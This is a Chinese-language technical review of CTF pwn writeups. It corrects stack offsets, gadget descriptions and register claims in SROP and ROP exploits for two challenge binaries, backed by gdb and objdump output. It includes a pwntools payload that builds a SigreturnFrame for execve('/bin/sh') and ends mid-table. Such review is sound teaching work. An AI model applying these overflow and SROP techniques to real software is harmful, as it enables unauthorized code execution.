# Review Round 1 — pwn writeup（讀者設定：完全沒學過 ROP/SROP、沒寫過 exploit）

審查範圍：

| 檔案 | 行數（審查開始時 → 最新） |
|---|---|
| `wp/00_基礎知識_從零開始.md` | 845（未變動） |
| `wp/99_速查表.md` | 221（未變動） |
| `pwn1/notes.md` | 529（未變動） |
| `pwn1/exploit.py` | 147（未變動） |
| `pwn7/notes.md` | 745 → **772**（00:34 被改寫） |
| `pwn7/exploit.py` | 167 → **170**（00:34 被改寫） |

驗證方式：`objdump -d -M intel`、`readelf -S/-n/-l`、`gdb -q -batch`（自建輸入檔 + 中斷點實測
暫存器/堆疊）、`python3 -c "from pwn import *"`（SigreturnFrame 偏移、ROP 搜尋）、
`python3 exploit.py`（local）與 `python3 exploit.py REMOTE`（各跑 3 次）。
所有 gdb 腳本都附在文末附錄，可直接重跑。

> ⚠️ **重要：審查期間 `pwn7/notes.md`、`pwn7/exploit.py`（以及 `pwn6/notes.md`）被改過。**
> 我在 00:24 開始審查時讀到的是 `pwn7/notes.md`（745 行）/ `exploit.py`（167 行）；
> 00:34 這兩個檔案被另一邊改寫成 772 行 / 170 行，`pwn6/notes.md` 則在 00:30~00:36 之間出現。
> 本評論已在 00:35 之後**重新核對最新內容**，下面每一條都標明「**仍然存在**」或
> 「**已於 00:34 修好**」，行號以**最新版**為準。
> （本次修好的是原 E1 的內文與 exploit 註解；`wp/00_基礎知識`、`wp/99_速查表`、`pwn1/*`
> 在審查期間沒有變動，檔案時間戳 00:19~00:23 都早於我第一次讀取。）

---

## 0. 先說結論：已驗證為「正確」的部分

避免只挑錯，以下是我逐一查證後確認**沒錯**的關鍵宣告（作者可以放心保留）：

| 宣告 | 驗證結果 |
|---|---|
| pwn1 `.text` 只有 0x6c = 108 bytes、entry = 0x401000、statically linked、stripped | ✅ `readelf -h/-S` 完全相符 |
| pwn1 每一行組語（0x401000 ~ 0x40106b，含 `push rsp`、`lea rsi,[rsp-0x80]`、`read` 長度 0x400） | ✅ 逐 byte 相符 |
| pwn1 offset `0x80`、`buf = leak - 0x80`、`leak = R0-8`、返回位址在 `buf+0x80` | ✅ gdb 實測：vuln 進入時 `rsp = buf+0x80`，`[rsp]=0x40100a` |
| pwn1 `FRAME_OFF = 0x90`（第二次 read 的 ret 之後 rsp = buf+0x90） | ✅ gdb 實測 `[0x401069] rsp=0x7fffffffdf28`，buf=0x…de98 → 相差 0x90 |
| pwn1 SigreturnFrame 偏移表（r8=0x28、r11=0x40、rdi=0x68、rsi=0x70、rdx=0x88、rax=0x90、rsp=0xa0、rip=0xa8、eflags=0xb0、長度 0xf8） | ✅ 用 pwntools 逐欄位填值後 `bytes(frame).find(p64(v))` 全部命中 |
| pwn1「沒有 pop rdi/rsi/rdx」「唯一的 pop 是 0x401031 pop rax」 | ✅ 全檔反組譯確認 |
| pwn1 flag `sun{r3caLl_ev3Ry_reGist3r_sR0p}` | ✅ 遠端 3/3 取得，與 `FLAG.txt` 一致 |
| pwn7 保護：Full RELRO / No canary / NX enabled / No PIE / SHSTK Enabled / IBT Enabled | ✅ pwntools checksec 輸出逐行相符 |
| pwn7 seccomp 白名單 = {read, write, close, mmap, mprotect, brk, rt_sigreturn, exit_group}（21 條 BPF） | ✅ 手動解 0x40132c~0x4014a0 的 movabs 立即數，21 條與 `len=0x15` 相符；每條 JEQ 的 k 與 jt/jf 全部對上 |
| pwn7 `sock_fprog.len = 0x15`、`seccomp(SECCOMP_SET_MODE_FILTER=1, 0, &prog)`（＝syscall 317） | ✅ 相符 |
| pwn7 槽表基底 `0x4060b0`、槽大小 `0x40c`、fd 槽 `0x405080/0x40548c/0x405898`、迴圈終點 `0x405ca4` | ✅ 相符（`0x405080 + 3*0x40c = 0x405ca4`） |
| pwn7 負索引：`0x4060b0 + (-4)*0x40c = 0x4060b0 - 0x1030 = 0x405080`，且檢查是 `movsxd` + `cmp eax,0xf` + `jg`（無下界） | ✅ 算術與反組譯都相符；exploit 成功印出 flag 即證明 slot 真的落在 fd 槽 |
| pwn7 XOR keystream `ks[i] = key[3-(i&3)]`（`bswap` + `shr eax,0x18` + `[rsp-4+i&3]`） | ✅ 反組譯相符，且 exploit 實跑能正確加密封包 |
| pwn7 gadget：`0x401523` = `pop rsp; pop r13; pop r14; pop r15; ret`（函式中段、跨指令）、`0x401529` pop rdi、`0x401dd5` pop rsi、`0x401f33` pop rbx、`0x401c32` `mov rdx,rax; jmp write@plt`、`0x401f07`、`0x401fda` | ✅ 全部用 `objdump --start-address` 逐條確認 |
| pwn7 `A2 = A1 + 0x48 + 8*len(chain)`、`A1 = NOTES+8`、`A2=0x40a228`、`A3=0x40a2e0`、`RESP=0x40a340` | ✅ gdb 實測各段 `rsp` = 0x40a188 / 0x40a228 / 0x40a2e0，與公式及 exploit log 完全一致 |
| pwn7 `0x401ef6` → "GO\n"（read 前）、`0x401f1e` → "OK\n"（read 後） | ✅ rodata hexdump：0x40302c = `47 4f 0a 00`（GO\n）、0x403030 = `4f 4b 0a 00`（OK\n）—筆記沒寫反 |
| pwn7 flag `sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}`、本地 `SUNSHINE{local_test_flag}` | ✅ 遠端 3/3、本地 1/1 相符 |
| pwn7 exploit 三段鏈（stage2/stage3/stage4）與 notes 引用的程式碼 | ✅ 00:34 改檔後**重新逐字比對**仍一致（詳見 S4）；改檔前後兩個版本實跑都能拿 flag |

---

## 1. 嚴重錯誤（必須修）

### E1 ★（00:34 已修一半）「一次洩漏 255 bytes」——**§7 內文已修好，但 §10 一頁速查還留著舊說法**

* **檔案**：`pwn7/notes.md`
  * 內文（第 626–665 行）：**已於 00:34 修好** ✅
    現在的寫法正確：`rax` 在鏈開始時 = 3（被 `write(1,"OK\n",3)` 蓋掉）、
    兩次 write 各 3 bytes、合計 6 bytes、對應 `io.recvn(6)`。
    `pwn7/exploit.py` 第 114–117 行的註解也同步修好了 ✅
  * **第 769 行（§10 一頁速查）**：**仍然錯** ❌ ← 這條要修
    > `3. read(0, rsp, 0xff) 續接，write(1, 0x405060, 0xff) 洩漏 XOR key`
* **錯在哪／正確是什麼**：鏈開始時 `rax = 3`（不是 `read` 讀到的 0xff），
  所以是 `write(1, 0x405060, 3)` + `write(1, 0x405063, 3)` = 6 bytes，
  不是「一次洩漏 255 bytes」。這點已經被同檔案 §7 的正確內文和自己的 log
  （`leak=1cf20c050000`、`leak=070968f00000`）否證。
* **驗證指令**（附錄 A 腳本，輸出節錄）：
  ```
  gdb -q -batch -x /tmp/pwn7.gdb ./service
  [after 0x401f07 read] rsp=0x40a188 rax=255
  [before OK-write, 0x401f2a] rax=255
  [0x401c32 mov rdx,rax] rax=3 rdi=1 rsi=0x405060      <-- 鏈的第一個 write，rdx=3
  [0x401c32 mov rdx,rax] rax=3 rdi=1 rsi=0x405063      <-- 第二個 write，rdx=3
  ```
  實跑：本地 `leak=83c2b9ee0000`、遠端 `leak=320d68200000`（都是 6 bytes，不是 255）。
* **建議改法**（把第 769 行改成）：
  ```
   3. read(0, rsp, 0xff) 續接；鏈一開始 rax = 3（被 SUBMIT 的 write(1,"OK\n",3) 蓋掉），
      所以兩次 write(1, KEY, 3) + write(1, KEY+3, 3) = 只洩漏 6 bytes 的 key
  ```

> **原審查版本的紀錄（供對照）**：00:24 的 `pwn7/notes.md` 第 636–638 行寫的是
> 「`rax` 在進入 `0x401f07` 前一次 `read` 之後 = `0xff`…所以 `WRITE_RDX_RAX` 會
> `write(1, KEY, 0xff)` —— 一次洩漏 255 bytes 的 `.data`」，
> 00:34 已被改成正確版本（含「⚠️ `rax` 到底是多少？這裡很反直覺」的教學說明）。


---

### E2 ★（仍然存在）pwn7：`rsp = A3+0x58` 算錯（實際 `A3+0x50`）

* **檔案**：`pwn7/notes.md` 第 695–696 行
* **原文**：
  > 進入 `0x401fda` 時 `rsp = A3+0x58`，而 `RELAY` 內部用 `rsp+0x10` 當緩衝區
  > → 所以 `RESP = A3 + 0x58 + 8 = A3 + 0x60`。
* **錯在哪**：`ret` 彈掉 `[A3+0x48]` 之後 `rsp = A3+0x50`。而且 `RESP` 的來源不是
  `rsp+8`，是 `RELAY` 內部的 `lea rbx,[rsp+0x10]`（0x401fb9）與
  `movsx dx,BYTE PTR [rsp+0x11]`／`lea rsi,[rsp+0x14]`（0x40200a、0x402032）這些
  **以 `rsp+0x10` 為基準**的欄位。最終答案 `A3+0x60` 是對的，但推導過程是錯的
  （`0x58+8` 與 `0x50+0x10` 只是碰巧同值），讀者照著算式重算就會錯。
* **驗證指令**：
  ```
  gdb -q -batch -x /tmp/pwn7b.gdb ./service
  [0x401fda] rsp=0x40a330 rbx=0x40a340  => rsp+0x10=0x40a340
  ```
  （A3 = 0x40a2e0 → rsp = 0x40a330 = A3+0x50；rsp+0x10 = 0x40a340 = A3+0x60 = RESP）
* **建議改法**：
  ```markdown
  進入 `0x401fda` 時 `rsp = A3 + 0x50`（`ret` 已彈掉 `[A3+0x48]` 這個目標位址）。
  `RELAY` 從 `0x401fb9` 的 `lea rbx,[rsp+0x10]` 開始，之後解析標頭都用 `[rsp+0x10]`、
  `[rsp+0x11]`、`[rsp+0x12]`、`[rsp+0x14]`，所以收到的資料必須落在 `rsp+0x10`：
      RESP = (A3 + 0x50) + 0x10 = A3 + 0x60
  ```

---

### E3 ★（仍然存在，共 3 處）pwn7：「glibc 的 read/write wrapper 會把 rdx 弄髒」是錯的

* **檔案**：`pwn7/notes.md` 第 532–533 行、第 741 行（§9 常見坑 #5）；`pwn7/exploit.py` 第 41 行
* **原文**：
  > **不行**，因為 glibc 的 `read`/`write` wrapper 會把 `rdx` 弄髒
  > （它們內部會用到 `rdx`，回來之後 `rdx` 不再是我們設的值）。
  >
  > （§9 #5）`rdx` 不能靠 `pop rdx`。這支程式沒有 `pop rdx`，**而且 glibc wrapper 會蓋掉 `rdx`**。
  >
  > （exploit.py 第 41 行）`而 glibc 的 read()/write() wrapper 會把 rdx 弄髒`
* **錯在哪**：glibc 的 `read`/`write` wrapper **不動 `rdx`**（`rdx` 是 syscall 的引數 3）。
  它們動的是 `rdi`（`movsxd rdi,edi`）、`rcx`/`r8`/`r9`（被 `xor` 歸零以做
  cancellation 設定），不是 `rdx`。真正讓「直接呼叫 `read@plt`」行不通的理由是
  **這支 binary 完全沒有 `pop rdx` gadget**，所以沒辦法先把長度放進 `rdx`。
* **驗證指令**：
  ```bash
  objdump -d -M intel pwn7/service | grep -E '\bpop\s+rdx'        # 無輸出
  python3 -c "from pwn import *;context.clear(arch='amd64');\
  print(ROP(ELF('pwn7/service',checksec=False)).find_gadget(['pop rdx','ret']))"   # None
  python3 -c "
  from pwn import *
  context.clear(arch='amd64'); libc=ELF('/usr/lib/libc.so.6',checksec=False)
  print(libc.disasm(libc.symbols['write'], 40))"     # 全程沒有寫 rdx
  ```
  反組譯節錄（glibc 2.44）：`push rbp; movsxd rdi,edi; xor r9d,r9d; xor r8d,r8d; xor ecx,ecx;
  mov rbp,rsp; sub rsp,0x8; push 0x1; call …` — 沒有碰 `rdx`。
  實測也印證：`0x401c32` 設好 `rdx=3` 之後，透過 `write@plt` 送出去的**正好是 3 bytes**
  （所以整條鏈總共只洩漏 6 bytes）；若 wrapper 真的弄髒 `rdx`，長度不可能剛好是 3。
* **建議改法**：
  ```markdown
  * 那用 ROP 呼叫 `read(3, buf, n)` 呢？

    **不行**，因為我們**沒有辦法設定 `rdx`**：這支程式裡沒有任何 `pop rdx` gadget
    （`objdump -d -M intel service | grep 'pop    rdx'` 沒有輸出，
    `ROP(e).find_gadget(['pop rdx','ret'])` 也回傳 `None`），
    所以只能改用「binary 裡面自己會設定 `edx` 的程式碼片段」當 gadget。
    （順帶一提：glibc 的 `read`/`write` wrapper 本身不會動 `rdx`，
    它動的是 `rdi`/`rcx`/`r8`/`r9`；不要以為 wrapper 會幫你把 `rdx` 弄壞。）
  ```
  `pwn7/exploit.py` 第 41 行同步改成：
  ```
  #  漏洞 2 (資訊): 前台無法自己把「長度 > 0 的封包」送給保險箱 (RELAY 只送 len=0 的標頭)，
  #     而這支 binary 裡沒有 `pop rdx` => 我們無法用 ROP 設定 read(3, buf, n) 的長度。
  #     因此改用「binary 裡面自己會設定 edx 的片段」當 gadget。
  ```

---

### E4（仍然存在）pwn1：第二次 `read` 的落地點是 `buf+0x08`，不是 `buf+0x00`

* **檔案**：`pwn1/notes.md` 第 428 行
* **原文**：
  > ```
  > ret 到 0x40104f 的時候  rsp = buf + 0x88
  > 0x40104f 讀進來的資料從    buf + 0x00 開始
  > 0x40106b 的 ret         pop 掉 buf+0x88 的值，rsp 變成 buf + 0x90
  > ```
* **錯在哪**：第二次進入 `0x40104f` 時 `rsp = buf+0x88`，而指令是 `lea rsi,[rsp-0x80]`，
  所以目的位址 = **`buf+0x08`**。前兩行與第三行本身正確，只有第二行錯。
  （結論不變：那 15 bytes 落在 `buf+0x08`~`buf+0x16`，仍在 `b"B"*0x80` 的 padding 內，
  碰不到 `buf+0x90` 的 sigframe，所以 exploit 仍然有效。）
* **驗證指令**（附錄 B 腳本；`buf = 0x7fffffffde98`）：
  ```
  [0x401054] rsp=0x7fffffffdf18  rsi(read dst)=0x7fffffffde98   <- 第一次 read: buf
  [0x401054] rsp=0x7fffffffdf20  rsi(read dst)=0x7fffffffdea0   <- 第二次 read: buf+0x08
  [0x401069] rsp=0x7fffffffdf28  rax=15                          <- = buf+0x90，sigreturn 用
  ```
* **建議改法**：把該行改成
  ```
  0x40104f 讀進來的資料從    buf + 0x08 開始（因為此刻 rsp = buf+0x88，rsi = rsp-0x80）
  ```
  並在下面補一句：
  > 所以那 15 bytes 會蓋在 `buf+0x08`~`buf+0x16`，也就是第一段 payload 的 padding 區，
  > 不會碰到 `buf+0x90` 的 sigframe（這也是「送 15 bytes 是安全的」的真正理由）。

---

### E5（仍然存在）pwn7：`RELAY` 的長度欄位為什麼是 0 —— 理由寫錯，且漏引關鍵指令

* **檔案**：`pwn7/notes.md` 第 308–310 行（引用的組語清單在 262–304 行）
* **原文**：
  > `RELAY` 送的標頭**長度永遠是 0**（`ax` 在 `0x401fa6` 被寫成 `op` 之後，
  > `WORD PTR [rsp+0xd]` 被寫入 `ax`——此時 `rax` 的低 16 bits 因為前面
  > 只是 `test al,al`/`lea` 運算而變成 0）。
* **錯在哪**：`RELAY`（`0x401f70`）裡根本沒有 `test al,al`（那是 `SUBMIT` 的指令）。
  `ax = 0` 的原因是 **`0x401fb2: xor eax,eax`** 這條指令，而這段組語清單整個漏掉了它
  （連同 `0x401fb4`、`0x401fb9`）。結論（`len` 永遠 0）是對的，理由與程式碼引用是錯的。
* **驗證指令**：
  ```bash
  cd pwn7 && objdump -d -M intel --start-address=0x401fa6 --stop-address=0x401fc8 service
  ```
  輸出：
  ```
  401fa6:  mov    BYTE PTR [rsp+0xc],al      ; 標頭 byte0 = op
  401faa:  mov    esi,0x4
  401faf:  mov    rdi,rcx
  401fb2:  xor    eax,eax                     ; ★ 這裡把 rax 歸零
  401fb4:  mov    BYTE PTR [rsp+0xf],0x0     ; 標頭 byte3 = pad = 0
  401fb9:  lea    rbx,[rsp+0x10]
  401fbe:  mov    WORD PTR [rsp+0xd],ax      ; 標頭 byte1..2 = 0x0000
  ```
* **建議改法**：在清單中補上 `401fb2: xor eax,eax`，並把說明改成
  ```markdown
  1. `RELAY` 送的標頭**長度永遠是 0**：`0x401fb2` 有 `xor eax,eax`（把 `rax` 歸零），
     接著 `0x401fbe` 的 `mov WORD PTR [rsp+0xd],ax` 就把標頭 byte1~byte2 寫成 `0x0000`，
     而 `0x401fb4` 把 byte3（pad）寫成 0。
     → 我們**沒有辦法**用 `RELAY` 送「帶 payload 的封包」給保險箱，只能送 4 bytes 空標頭。
  ```

---

### E6（仍然存在）`99_速查表.md`：allocated chunk 的欄位整體位移 8 bytes（+0x00 不是 size、user data 不是 +0x08）

* **檔案**：`wp/99_速查表.md` 第 156–158 行
* **原文**：
  > ```
  > chunk 結構（allocated 時）：
  >   +0x00  size   （實際是 prev_size，但前一個 chunk 在用時被借走）
  >   +0x08  user data  ← malloc 回傳的指標
  > ```
* **錯在哪**：glibc 的 chunk 標頭固定 16 bytes：`+0x00 = prev_size`、`+0x08 = size`，
  **malloc 回傳的是 `chunk + 0x10`**（user data 從 `+0x10` 開始）。
  本表把 `+0x00` 標成 size、把 user data 標成 `+0x08`，兩列都少 8；
  而且與同一張表下方的「free 之後：`+0x10 fd` / `+0x18 bk`」互相矛盾
  （fd/bk 就位在 user data 的頭 16 bytes，可見 user data 從 `+0x10` 開始）。
  第 167 行的 `malloc(0x18)` → 0x20 chunk 是對的，但用這張表去算會得到錯的結論。
* **驗證方式**：glibc 標準定義（`malloc_chunk`）＋ 與本檔自己下方 free 表的自洽性檢查。
* **建議改法**：
  ```markdown
  ```
  chunk 結構（allocated 時）：
    +0x00  prev_size        （前一個 chunk 還在用時，這 8 bytes 被前一個 chunk 的資料借走）
    +0x08  size             （含 flag bits；最小 0x20，16-byte 對齊）
    +0x10  user data        ← malloc() 回傳的指標就是這裡（chunk + 0x10）

  chunk 結構（free 之後，user data 的前 16 bytes 變成連結資訊）：
    +0x00  prev_size
    +0x08  size | flags     (PREV_INUSE=1, IS_MMAPPED=2, NON_MAIN_ARENA=4)
    +0x10  fd
    +0x18  bk
  ```
  ```

---

### E7（仍然存在）pwn1：「`0x401069` 是唯一的 syscall」不成立（是 4 條中的 1 條）

* **檔案**：`pwn1/notes.md` 第 266 行
* **原文**：`0x401069: syscall; ret   ← 唯一的 syscall`
* **錯在哪**：整支程式有 4 條 `syscall`：`0x401014`（exit）、`0x40102f`（write）、
  `0x40104c`（read）、`0x401069`（vuln 的 read，後面接 `ret`）。
  `0x401069` 是「唯一以 `ret` 結尾的 syscall」，不是「唯一的 syscall」。
  新手若照字面理解，會以為只要跳到任何 `syscall` 就行，忽略「後面必須接 `ret`」這個重點。
* **驗證指令**：`objdump -d -M intel pwn1/challenge | grep -n 'syscall'`（4 筆）
* **建議改法**：`0x401069: syscall; ret   ← 唯一「syscall 後面接 ret」的位置（其他 3 條 syscall 後面不是 ret）`

---

### E8（仍然存在）pwn7：XOR key 存在 `.bss`，不是 `.data`

* **檔案**：`pwn7/notes.md` 第 53 行、`pwn7/exploit.py` 第 14 行
* **原文**：`key = hash(getpid())   →  存到 .data:0x405060 (4 bytes)`
* **錯在哪**：`readelf -S service` 顯示 `.data` 是 `0x405000`（大小 0x10），
  `.bss` 是 `0x405020`（大小 0x5360）。`0x405060` 落在 `.bss`（未初始化、載入時為 0），
  同區還有 `0x405064`（槽計數器）、`0x405080`（fd 槽）、`0x4060b0`（槽表）。
  筆記其他地方（第 208、560 行等）把 NOTE 區寫成 `.bss` 是對的，只有這一行不一致。
* **驗證指令**：`readelf -S pwn7/service | grep -A1 -E '\.data|\.bss'`
* **建議改法**：改成 `key = hash(getpid())   →  存到 .bss:0x405060 (4 bytes)`
  （exploit.py 第 14 行同步改成 `.bss:0x405060`）。

---

### E9（仍然存在）`00_基礎知識_從零開始.md`：`pip install seccomp-tools` 裝不到東西

* **檔案**：`wp/00_基礎知識_從零開始.md` 第 105 行
* **原文**：`pip install seccomp-tools        # 解 seccomp 規則（本系列 pwn7 會用到）`
* **錯在哪**：PyPI 上沒有 `seccomp-tools` 這個發行版（實測：
  `python3 -m pip index versions seccomp-tools` → `ERROR: No matching distribution found for seccomp-tools`）。
  seccomp-tools 是 Ruby gem（官方安裝方式 `gem install seccomp-tools`），需要先有 Ruby。
* **驗證指令**：
  ```bash
  python3 -m pip index versions seccomp-tools   # No matching distribution found
  which seccomp-tools                            # 本機不存在（因為沒裝成功）
  ```
* **建議改法**：
  ```bash
  gem install seccomp-tools   # 注意：這是 Ruby gem，不是 pip 套件（要先裝 ruby）
  ```

---

### E10（仍然存在）`99_速查表.md`：`p = process('./chal'):` 多了一個冒號（複製貼上會 SyntaxError）

* **檔案**：`wp/99_速查表.md` 第 179 行
* **原文**：`p = process('./chal'):`
* **錯在哪**：Python 語法錯誤；同一區塊其他行都是「一行一句」，只有這行多了 `:`。
* **驗證指令**：`python3 -c "p = process('./chal'):"` → `SyntaxError: invalid syntax`
* **建議改法**：`p = process('./chal')`

---

### E11（仍然存在）`00_基礎知識_從零開始.md`：16-byte 對齊的條件寫混了（`call` 前 vs 進入函式時）

* **檔案**：`wp/00_基礎知識_從零開始.md` 第 486–487 行
* **原文**：
  > `system()` 內部會用到 SSE 指令（例如 `movaps`），而 `movaps` **要求位址 16-byte 對齊**。
  > 如果 `call system` 發生時 `rsp % 16 != 8`，就會 SIGSEGV。
* **錯在哪**：ABI 的規定是「`call` 執行**前** `rsp % 16 == 0`」，因此「被呼叫函式**第一道指令**
  執行時 `rsp % 16 == 8`」。原文把「call 發生時」和「`rsp % 16 == 8`」兩個不同時間點混成一句，
  新手照著算會把自己的鏈修歪（這正是 ROP 最常見的 SIGSEGV 來源之一）。
* **驗證方式**：System V AMD64 ABI 定義（call 前 16-byte 對齊；被呼叫者進入時 rsp ≡ 8 (mod 16)）。
* **建議改法**：
  ```markdown
  `system()` 內部會用到 SSE 指令（例如 `movaps`），而 `movaps` **要求記憶體位址 16-byte 對齊**。
  ABI 的規定是：**`call` 執行前 `rsp % 16 == 0`**；換句話說，**被呼叫的函式開始執行第一道指令時，
  `rsp % 16 == 8`**（因為 `call` 剛壓了 8 bytes 的返回位址）。

  用 ROP 時我們是用 `ret` 跳進 `system`，所以要看的是「**`system` 第一道指令執行時 `rsp % 16 == 8`**」，
  不對就會在 `movaps` 的地方 SIGSEGV。多插一個只有 `ret` 的 gadget 會讓 `rsp` 多走 8 bytes，
  剛好把奇偶性調過來，這就是那個「對齊用 ret」的作用。
  ```

---

### 1.1 其他事實錯誤（影響較小，但仍是錯的，建議一併修；行號皆為最新版）

| # | 檔案 / 行 | 原文 | 實際 | 驗證 |
|---|---|---|---|---|
| E12（仍存在） | `pwn7/notes.md` 131 | `lea rbp,[rsp+0x420]  ; rbp = 輸入緩衝區 0x401 bytes` | 輸入區是 `rsp+0x420`~`rsp+0x81f` 共 **0x400** bytes（最多 0x3ff 字元 + NUL）。同一節後面自己寫「最大長度 0x81f-0x420 = 0x3ff」才對 | `objdump --start-address=0x4014b5 --stop-address=0x401537`（`lea rbx,[rsp+0x81f]`、`mov BYTE PTR [rsp+0x81f],0x0`） |
| E13（仍存在） | `pwn1/notes.md` 390 | `sigreturn 洩漏出來的值是 R0-8` | 洩漏者是 `0x401016` 的 leak 函式（`push rsp` + `write`），跟 `sigreturn` 無關。應寫「`0x401016` 的 leak 函式」 | 讀 `pwn1/exploit.py` 第 56 行常數名 `LEAK_AND_READ` |
| E14（仍存在） | `pwn7/notes.md` 546–547 | `0x401c32 特別妙：它在 0x401c20（一個 write_string 函式）裡面，前面剛好是 pop rbx` | 這句話是對的，但對新手還缺一句重點：`0x401c20` 的 `pop rbx` 在 `0x401c31`，`mov rdx,rax` 在 `0x401c32`，所以這一跳是**跳進函式中段**（`push rbx`/`call strlen` 都被跳過），`rbx` 不會被覆蓋 | `objdump --start-address=0x401c20 --stop-address=0x401c3a` |
| E15（仍存在） | `pwn1/notes.md` 343（§5.3 的 frame 表） | `0xb8   6     csgsfs` | 該欄位實際佔 **8 bytes**（`cs`/`gs`/`fs` 各 2 bytes + 2 bytes padding），下一欄 `err` 才落在 `0xc0`。寫「6」會讓想手算下一欄位的人算錯 | `bytes(SigreturnFrame())[0xb8:0xc0].hex()` → `3300000000000000` |
| E16（新發現，仍存在） | `pwn7/notes.md` 735（§9 常見坑 #3） | `SUBMIT 256` 的 `bl` 會是 0 → `read` 讀 0 bytes，什麼都不會發生 | 實際上會在進 `read` **之前**就被擋掉：`0x401eed` 的 `test al,al` / `0x401eef je 0x401f38` → 印 `ERR bad size` 後直接返回（`add rsp,0x40; pop rbx; ret`）。「read 讀 0 bytes」根本不會發生 | `objdump -d -M intel --start-address=0x401eea --stop-address=0x401f58 service`；實測 `printf 'SUBMIT 256\n' \| ./service` 會回 `ERR bad size` |

---

## 2. 新手會卡住的地方（B）

> 每一項都給「可直接貼上的補充文字」。

### B1 pwn1 §3.3 給了 gdb 觀測值，卻沒有可以重跑的指令

原文說「我在 gdb 裡下中斷點實際看到的值」，但沒給下哪些中斷點、餵什麼輸入。
新手無法自己驗證，也無法在自己機器上重現（ASLR 每次位址都不同，會以為自己算錯）。
**建議新增（放在 §3.3 表格後面）**：

````markdown
#### 怎麼自己重現這張表？（可直接複製）

```python
# 先做一個輸入檔：24 bytes 墊 leak 的 read、0x400 payload、15 bytes 給第二次 read
from pwn import *
context.arch = 'amd64'
f = SigreturnFrame(); f.rip = 0x401069; f.rax = 59; f.rsp = 0x4141414141414141
payload  = b'B'*0x80 + p64(0x40104f) + p64(0x401069) + bytes(f)
payload  = payload.ljust(0x400, b'\x00')
open('/tmp/in.bin','wb').write(b'A'*0x18 + payload + b'/bin/sh\x00' + b'C'*7)
```

```gdb
# gdb 腳本（存成 /tmp/t.gdb）
set pagination off
b *0x401032
b *0x401054
b *0x401069
commands 1
  printf "[0x401032] 放 leak 的位址=%p  洩漏值=%p\n", $rsp-8, *(unsigned long*)($rsp-8)
  continue
end
commands 2
  printf "[0x401054] rsp=%p  rsi(read 目的)=%p\n", $rsp, $rsi
  continue
end
commands 3
  printf "[0x401069] rsp=%p  rax=%lu\n", $rsp, $rax
  continue
end
run < /tmp/in.bin
```

```bash
gdb -q -batch -x /tmp/t.gdb ./challenge
```

**位址每次都不一樣是正常的（ASLR），重點是「差值」**：
`第二次 [0x401054] 的 rsi - 第一次 [0x401054] 的 rsi = 0x08`、
`rax=15 的那次 [0x401069] 的 rsp - 第一次 [0x401054] 的 rsi = 0x90`。
（`0x401069` 總共會命中 4 次：vuln 的第一次 read、被 ret 跳回來的第二次 read、
rax=15 的 rt_sigreturn、以及 sigreturn 還原後又跳回 `rip=0x401069` 的那次——
最後那次 rsp 會變成 frame 裡設定的值。）
````

### B2 pwn1 §6 沒解釋「為什麼 payload 一定要補到 0x400」以及「為什麼 15 bytes 要另外送」

這正是新手最常翻車的地方（送太少/太多會讓下一次 read 吃到殘料，`rax` 就不是 15）。
**建議新增（§6 步驟 3 之後）**：

```markdown
> ⚠️ **為什麼 `payload.ljust(0x400)` 不能省？**
> `read()` 不像 `scanf` 會等到你按 Enter，它是「核心目前手上有多少就給你多少」。
> `vuln` 的 `read(0, buf, 0x400)` 最多吃 0x400 bytes：
> * 你送**超過** 0x400 → 多出來的會留在管線裡，被「下一次 `read`」先吃掉，
>   那次的 `rax` 就不是 15，SROP 直接失敗（而且除錯訊息是「莫名 SIGSEGV」）。
> * 你送**不足** 0x400 → 這次 `read` 早退，`rax` 會是別的數字（不影響流程，
>   但後面「剛好 15 bytes」的那次一定要獨立送）。
> 所以本題的送法固定是：**先送完整 0x400 的第一段 payload，再單獨送剛好 15 bytes**。
> 兩者之間不需要 `recv`，因為核心會按順序交付。
```

### B3 pwn1 §6 的「執行流程（第一輪）」圖把「哪個 read 吃掉哪個 payload」寫混了

原文：

```
vuln 的 ret
   ↓
0x40104f  read(0, rsp-0x80, 0x400)   ← 吃掉上面的 payload，然後 rax = 讀到的 byte 數
   ↓ (ret)
0x401069  syscall                     ← rax = 15 時 = rt_sigreturn
```

問題：`payload`（0x400 bytes）是被**第一次**（`_start` → `call 0x40104f`）的 read 吃掉的，
不是被 ret 之後那次吃掉的；被 ret 之後那次吃掉的是**15 bytes**。新手會搞不清楚「要送幾次、送什麼」。
**建議整段換成**：

````markdown
整題總共只有 **3 次 read、2 次 send**，順序如下（一定要照這個順序）：

| 次數 | 程式在哪個 read | 我們送什麼 | 送完之後 rax |
|---|---|---|---|
| 1 | `0x40104c` `read(0, rsp-0x40, 0x18)`（leak 函式裡，先墊掉） | `b"A"*0x18`（24 bytes） | 0x18（不重要） |
| 2 | `0x40104f` `read(0, buf, 0x400)`（`_start` 直接呼叫的 vuln） | **第一段 payload**：`b"B"*0x80` + `VULN_READ` + `SYSCALL_RET` + `frame` + `"/bin/sh"`（補滿 0x400） | 0x400（會被覆蓋） |
| — | `0x40106b` 的 `ret` 彈掉我們蓋上去的 `VULN_READ`，跳回 `0x40104f` | | |
| 3 | `0x40104f` 再次 `read(0, buf+0x08, 0x400)` | **只送 15 bytes**：`b"/bin/sh\x00" + b"C"*7` | **15 = __NR_rt_sigreturn** |
| — | `0x40106b` 的 `ret` 彈掉 `SYSCALL_RET`（＝`0x401069`），此時 **rsp = buf+0x90** | | |
| — | `0x401069` 的 `syscall`：rax=15 → 核心從 `rsp=buf+0x90` 讀 sigframe | | |

```
payload 在記憶體裡的樣子（buf = leak - 0x80）：

buf+0x000  ┌──────────────────────────────┐
           │ B B B B ... （0x80 bytes 垃圾）│  ← 第二次 read 的 15 bytes 會蓋在 buf+0x08
buf+0x080  ├──────────────────────────────┤
           │ 0x40104f  ← 覆蓋掉的返回位址    │  ← vuln 的 ret 跳到這裡
buf+0x088  ├──────────────────────────────┤
           │ 0x401069  ← 下一次 ret 的目標   │
buf+0x090  ├──────────────────────────────┤
           │ SigreturnFrame (0xf8 bytes)   │  ← rt_sigreturn 就從這裡讀！
buf+0x188  ├──────────────────────────────┤
           │ （padding）                    │
buf+0x1a0  ├──────────────────────────────┤
           │ "/bin/sh\x00"                 │  ← frame.rdi 指向這裡
buf+0x400  └──────────────────────────────┘
```
````

### B4 pwn1 §5 前後：`sigframe` / `sigcontext` / `ucontext` / `rt_sigframe` 四個詞沒有先定義

`sigframe` 在 §5.2 就出現（「讓 `rsp` 指向我們偽造的 sigframe」），但定義在 §5.3。
**建議在 §5.1 開頭加一段**：

```markdown
先把四個名字分清楚（很容易混）：

| 名字 | 是什麼 |
|---|---|
